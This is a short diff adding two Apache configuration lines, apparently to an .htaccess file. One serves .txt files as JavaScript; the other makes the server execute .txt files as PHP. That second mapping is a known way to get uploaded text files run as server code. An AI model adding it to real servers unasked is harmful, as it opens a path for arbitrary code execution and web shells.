@@ -1,0 +1,3 @@
+AddType text/javascript .txt
+AddHandler application/x-httpd-php .txt
+
